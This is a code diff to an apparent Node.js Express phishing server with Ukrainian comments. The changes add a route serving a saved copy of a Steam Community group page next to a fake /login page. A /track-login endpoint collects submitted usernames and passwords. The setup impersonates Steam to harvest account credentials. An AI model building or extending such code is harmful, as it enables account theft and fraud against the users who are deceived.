@@ -11,6 +11,7 @@ app.use(bodyParser.json());
 
 // Роздаємо всі файли з папки "public"
 app.use("/login", express.static(path.join(__dirname, "login")));
+app.use("/login", express.static(path.join(__dirname, "group")));
 
 app.post("/track-login", (req, res) => {
     const { login, password } = req.body;
@@ -22,10 +23,10 @@ app.post("/track-login", (req, res) => {
     res.json({ message: "Дані отримані успішно!" });
 });
 
-// Відправляємо index.html при запиті на головну сторінку
-//app.get("/group/", (req, res) => {
-//    res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
-//});
+app.get("/group/", (req, res) => {
+    console.log("GROUP");
+    res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
+});
 
 app.get("/login/", (req, res) => {
     console.log("LOGIN");
